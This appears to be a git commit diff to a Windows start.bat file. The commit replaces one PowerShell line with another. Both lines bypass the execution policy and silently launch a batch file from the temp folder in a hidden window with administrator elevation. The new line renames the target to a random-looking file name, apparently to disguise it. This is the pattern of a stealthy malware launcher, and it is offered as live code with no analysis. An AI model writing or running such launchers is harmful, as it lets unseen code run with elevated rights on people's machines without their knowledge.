bb8a4cc6d8b78df518f2ada0af6fc6baf64e616a
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-06 03:28:06 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\post.bat' -WindowStyle Hidden -Verb RunAs}"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
